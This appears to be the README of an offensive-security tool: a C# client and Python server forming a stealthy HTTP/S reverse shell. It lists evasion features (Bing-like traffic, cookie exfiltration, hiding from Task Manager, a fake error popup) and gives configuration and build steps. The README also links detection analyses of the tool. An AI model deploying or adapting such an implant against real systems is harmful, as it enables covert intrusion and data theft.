# HTTP/S Asynchronous Reverse Shell

![Banner](https://github.com/onSec-fr/Http-Asynchronous-Reverse-Shell/blob/master/Images/Architecture.png?raw=true)

------------

### ✨ Introduction

In an age where advanced detection systems such as IDS, IPS, EDR, AV, and firewalls dominate corporate networks, evading them during offensive security assessments is a challenge. Most reverse shells leverage TCP tunnels (L4), which are now routinely analyzed and flagged.

**This project presents an innovative solution**: a completely asynchronous reverse shell over HTTP/S that blends into normal web traffic by mimicking legitimate user behavior.

Unlike traditional reverse shells, it only uses **GET requests**, appears as **normal web queries**, and can optionally run over **HTTPS with a fake legitimate certificate**, minimizing the chances of detection.

------------

### How it works ?
1. The client app is executed on the target machine.
2. The client initiates the connection with the server.
3. The server accepts the connection - then :
> The client queries the server until it gets instructions.\
> The attacker provides instructions to the server.\
> When a command is defined, the client executes it and returns the result.  
> And so on, until the attacker decides to end the session.

[![](https://github.com/onSec-fr/Http-Asynchronous-Reverse-Shell/blob/master/Images/Concept.png?raw=true)](https://github.com/onSec-fr/Http-Asynchronous-Reverse-Shell/blob/master/Images/Concept.png?raw=true)

### Disclaimer

*This tool is only intended to be a proof of concept demonstration tool for authorized security testing. Make sure you check with your local laws before running this tool.*

### 🔧 Features

**Today, as a poc, the following functionalities are implemented:**

* Stealthy GET-only communication.
* Mimics Bing.com traffic.
* Base64-encoded commands in HTML.
* Exfiltration via HTTP cookies.
* Optional HTTPS with spoofed cert.
* Random delays and templates per request.
* Single PowerShell process reuse to evade EDR.
* Compatible with CMD & PowerShell commands.
* Optional fake error message popup.
* Hidden from Task Manager.
* Optional admin-level execution.

------------

### 🎥 Demonstration

**Client side**
[![](https://github.com/onSec-fr/Http-Asynchronous-Reverse-Shell/blob/master/Images/client_demo.gif?raw=true)](https://github.com/onSec-fr/Http-Asynchronous-Reverse-Shell/blob/master/Images/client_demo.gif?raw=true)

**Server side**
[![](https://github.com/onSec-fr/Http-Asynchronous-Reverse-Shell/blob/master/Images/server_demo.gif?raw=true)](https://github.com/onSec-fr/Http-Asynchronous-Reverse-Shell/blob/master/Images/server_demo.gif?raw=true)

------------

### ⚙️ Configuration

#### Client (C#)

1. Open `HARS.sln` in Visual Studio.
2. Edit `Config.cs` to match your environment:

```csharp
    class Config
        {
            /* Behavior */
            // Display a fake error msg at startup
            public static bool DisplayErrorMsg = true;
            // Title of fake error msg
            public static string ErrorMsgTitle = "This application could not be started.";
            // Description of fake error msg
            public static string ErrorMsgDesc = "Unhandled exception has occured in your application. \r\r Object {0} is not valid.";
            // Min delay between the client calls
            public static int MinDelay = 2;
            // Max delay between the client calls
            public static int MaxDelay = 5;
            // Fake uri requested - Warning : it must begin with "search" (or need a change on server side)
            public static string Url = "search?q=search+something&qs=n&form=QBRE&cvid=";
            /* Listener */
            // Hostname/IP of C&C server
            public static string Server = "https://127.0.0.1";
            // Listening port of C&C server
            public static string Port = "443";
            // Allow self-signed or "unsecure" certificates - Warning : often needed in corporate environment using proxy
            public static bool AllowInsecureCertificate = true;
        }
```

**Optional:** Edit `HARS.manifest` to adjust privilege level.

> `requestedExecutionLevel` can be set to `asInvoker`, `highestAvailable`, or `requireAdministrator`.

**Projet properties**

Here you can customize the assembly information and an icon for the file.

[![](https://github.com/onSec-fr/Http-Asynchronous-Reverse-Shell/blob/master/Images/project_config.png?raw=true)](https://github.com/onSec-fr/Http-Asynchronous-Reverse-Shell/blob/master/Images/project_config.png?raw=true)

Note : Target .NET framework version is set to 4.6 which is available by default in Windows 10.    
*For Windows 7, choose .NET 3.5 if you don't want to have to install missing features.*

#### Build

Build the project from Visual Studio.
The client should be generated in `Http Asynchronous Reverse Shell\HARS_Client\HARS\bin\Release` folder.

**Done!**

------------

#### Server (Python)

1. Edit `HARS_Server.py` in `HARS_Server/www/` to customize port or certificate path.

```python
PORT = 443
CERT_FILE = '../server.pem'
```

2. Run with:

```bash
python HARS_Server.py
```

#### Notes

-HTTP Logs are located in `Http Asynchronous Reverse Shell\HARS_Server\logs`\  
-You can add your own templates (any html page) in `Http Asynchronous Reverse Shell\HARS_Server\templates`

### 🔗 References

* [RSA NetWitness Detection Review by Lee Kirkpatric](https://community.rsa.com/community/products/netwitness/blog/2020/04/01/using-rsa-netwitness-to-detect-http-asynchronous-reverse-shell-hars)
* [Deep Dive Analysis by Nasreddine Bencherchali](https://nasbench.medium.com/understanding-detecting-c2-frameworks-hars-682b30f0505c)

---

------------
@onSec-fr
